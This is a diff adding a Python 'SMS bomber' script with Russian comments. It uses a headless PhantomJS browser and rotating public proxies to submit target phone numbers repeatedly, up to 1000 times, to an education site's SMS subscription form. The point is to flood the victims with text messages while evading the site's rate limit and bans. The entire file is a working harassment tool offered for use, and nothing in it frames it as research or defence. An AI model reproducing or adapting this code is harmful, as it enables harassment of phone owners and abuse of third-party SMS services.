@@ -1,0 +1,147 @@
+'''
+18.04.2018
+gdz.ru ввели таймер на отправку сообщений, теперь с каждым разом когда вводишь номер,
+                                                            таймер увеличивается на ~45 мин.
+                                                                                Вот жеж блять.
+'''
+ 
+#!/usr/bin/python
+ 
+'''
+    @program sms bomber
+    @version 1.2018
+    @code by 0xFF
+'''
+ 
+###########################################################################
+ 
+#Номер абонента для спама, например - 9123456789;
+#Можно через запятую несколько номеров сразу;
+CONST_PHONE = [9170006644,9276667799,9999969889]
+ 
+#Кол-во сообщений сколько нужно отправить;
+#При отправке всех сообщений программа завершится;
+CONST_MAX = 1000
+ 
+#Интервал отправки сообщений в секундах;
+#Чем больше интервал, тем меньше шанс быть забаненным;
+CONST_TIMEOUT = 15
+ 
+#Прокси https/ssl;
+#Нужно искать с минимальной задержкой, меньше 2.0 ms;
+proxies = [
+    #эти прокси от 14.04.2018
+    '122.183.137.190:8080',
+    '192.116.142.153:8080',
+    '95.37.106.175:53281',
+    '185.218.70.136:53281',
+    '45.77.80.15:80',
+]
+ 
+###########################################################################
+ 
+import datetime
+import time
+import os
+import random
+import sys,string
+import re
+ 
+def showstatus(message, type="new"):
+    now = datetime.datetime.now().strftime("%H:%M:%S")
+    icon = "*"
+    if type == "warn":
+        icon = "!"
+    elif type == "new":
+        icon = "*"
+    elif type == "error":
+        icon = "x"
+       
+    message = "[" + icon + "][" + now + "]" + " "+message
+    return message
+   
+from colorama import Fore, Back, Style, init
+init(autoreset=True)
+from time import sleep
+from msvcrt import getch
+from selenium import webdriver
+from selenium.webdriver.common.keys import Keys
+from selenium.webdriver.common.action_chains import ActionChains
+from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
+print('===================================================================')
+print(Fore.BLUE+Style.BRIGHT+'                     _                     _               ')
+print(Fore.BLUE+Style.BRIGHT+'   ___ _ __ ___  ___| |__   ___  _ __ ___ | |__   ___ _ __ ')
+print(Fore.BLUE+Style.BRIGHT+'  / __| \'_ ` _ \/ __| \'_ \ / _ \| \'_ ` _ \| \'_ \ / _ \ \'__|')
+print(Fore.BLUE+Style.BRIGHT+'  \__ \ | | | | \__ \ |_) | (_) | | | | | | |_) |  __/ |   ')
+print(Fore.BLUE+Style.BRIGHT+'  |___/_| |_| |_|___/_.__/ \___/|_| |_| |_|_.__/ \___|_|  '+Style.RESET_ALL+'v1.2018 ')
+print()
+print('===================================================================')
+print()
+print(showstatus("Подключение модулей...", "new"))
+ 
+proxy = random.choice(proxies)
+ 
+service_args=[
+    '--ignore-ssl-errors=true',
+    '--ssl-protocol=any'
+    '--proxy='+proxy,
+    '--proxy-type=https'
+]
+ 
+print(showstatus('Прокси выбран - ' + str(proxy), "new"))
+print(showstatus('Инициализация PhantomJs ...', "new"))
+dcap = dict(DesiredCapabilities.PHANTOMJS)
+dcap['phantomjs.page.settings.userAgent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36'
+driver = webdriver.PhantomJS(desired_capabilities=dcap,service_args=service_args)
+ 
+ 
+#print('\nПодключение к -> '+Fore.BLUE+Style.BRIGHT+'https://vip.gdz.ru')
+ 
+print('-------------------------------------------------------------------')
+ 
+i = 1
+try:
+    while i < CONST_MAX:
+        for PHONE in CONST_PHONE:
+            print(showstatus('Подключение к -> '+Fore.BLUE+Style.BRIGHT+'https://vip.gdz.ru', "new"))
+            driver.get('https://vip.gdz.ru/gdz/class-6/english/biboletova-workbook/e:0-t:1-a:1/')
+            sleep(1)
+            print(showstatus('[#'+str(i)+'] Отправка СМС на номер - ' + str(PHONE), "new"))
+            try:   
+                driver.find_element_by_xpath("//body[contains(@class,'bg-bl')]/div[contains(@class,'container')]/div[contains(@class,'inline-block')]/main[contains(@class,'content')]//form[@class='form-subscribe']/div[contains(@class,'authen')]/input[@name='msisdn']").send_keys(PHONE)
+                driver.find_element_by_xpath("//body[contains(@class,'bg-bl')]/div[contains(@class,'container')]/div[contains(@class,'inline-block')]/main[contains(@class,'content')]//form[@class='form-subscribe']/div[contains(@class,'authen')]/input[@class='submit-auth']").click()
+                sleep(1)
+                if "На Ваш номер телефона было выслано SMS-сообщение." in driver.page_source:
+                    i = i + 1
+                    print(showstatus(Fore.GREEN + Style.BRIGHT + 'Сообщение на номер '+ str(PHONE)+' успешно отправленно!','new'))
+                else:
+                    print(showstatus(Fore.RED + Style.BRIGHT + '[Ошибка] '+Style.RESET_ALL+'Сообщение на номер '+ str(PHONE)+' не отправлено ...','new'))
+                    err = driver.find_element_by_xpath("//body[contains(@class,'bg-bl')]/div[contains(@class,'container')]/div[contains(@class,'inline-block')]/main[contains(@class,'content')]//form[@class='form-subscribe']/div[contains(@class,'authen')]/p[contains(@class,'error-message')]").text
+                    print(showstatus(Fore.RED + Style.BRIGHT + '[Ошибка] '+Style.RESET_ALL+err,'new'))
+            except:
+                print(showstatus("Какая-то ошибка!",'warn'))
+                print(showstatus("Берем новую проксю ...",'new'))
+               
+                proxy = random.choice(proxies)
+                print(proxy)
+                service_args=[
+                    '--ignore-ssl-errors=true',
+                    '--ssl-protocol=any',
+                    '--proxy='+proxy,
+                    '--proxy-type=https'
+                ]
+                driver.quit()
+ 
+                dcap = dict(DesiredCapabilities.PHANTOMJS)
+                dcap['phantomjs.page.settings.userAgent'] = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36'
+                driver = webdriver.PhantomJS(desired_capabilities=dcap,service_args=service_args)
+               
+            print('-------------------------------------------------------------------')   
+           
+            t = 0
+            while t < CONST_TIMEOUT:
+                print(showstatus('Ожидание '+str(CONST_TIMEOUT - t)+' сек.','new'),end='\r')
+                t = t + 1
+                sleep(1)   
+except KeyboardInterrupt:
+            print(showstatus(Fore.BLUE + Style.BRIGHT + '[SMS BOMBER] '+Style.RESET_ALL+'Программа остановлена.','new'))
